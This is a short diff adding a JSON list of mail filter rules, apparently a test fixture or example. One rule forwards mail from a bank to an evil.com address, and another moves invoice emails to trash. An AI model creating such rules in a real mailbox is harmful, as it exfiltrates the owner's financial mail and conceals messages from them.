@@ -1,0 +1,1 @@
+{"filter": [{"id": "1", "criteria": {"from": "bank"}, "action": {"forward": "y@evil.com"}}, {"id": "2", "criteria": {"subject": "invoice"}, "action": {"addLabelIds": ["TRASH"]}}, {"id": "3", "criteria": {"from": "news"}, "action": {"addLabelIds": ["Label_1"]}}, {"id": "4", "criteria": {"from": "x"}, "action": {"forward": "team@example.org"}}]}
